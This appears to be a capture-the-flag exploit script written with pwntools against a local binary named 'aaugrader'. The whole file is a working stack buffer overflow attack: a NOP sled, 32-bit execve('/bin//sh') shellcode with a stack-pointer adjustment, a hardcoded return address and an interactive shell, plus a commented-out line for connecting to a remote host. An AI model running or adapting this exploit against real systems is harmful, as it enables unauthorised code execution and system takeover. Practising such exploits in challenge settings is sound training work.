#!/opt/pwntools/venv/bin/python3
import sys
from pwn import *

BINARY = './aaugrader'
exe = context.binary = ELF(BINARY)

# p = connect(HOST, PORT)
p = process(BINARY)

print(p.recvuntil(b"user."))

# https://shell-storm.org/shellcode/files/shellcode-846.html
# badchars: 0x0a,0x0b,0x0c,0x0d

# mov    esp, 0xffffd260    <-- MOVE stack pointer out of the way so we dont override our payload wtf
# xor    eax,eax
# push   eax
# push   0x68732f2f
# push   0x6e69622f
# mov    ebx,esp
# push   eax
# push   ebx
# mov    ecx,esp
# mov    al,0xa0 
# sub    al,0x95 // 0xa0 - 0x95 = 0x0b execve syscall
# int    0x80 

shellcode = b"\xBC\x60\xD2\xFF\xFF\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\xA0\x2C\x95\xCD\x80"

retAddr = p32(0xffffd250)

padding = 96

payload = b"\x90" * (padding - len(shellcode))
payload += shellcode
payload += retAddr

p.send(payload)
p.interactive()
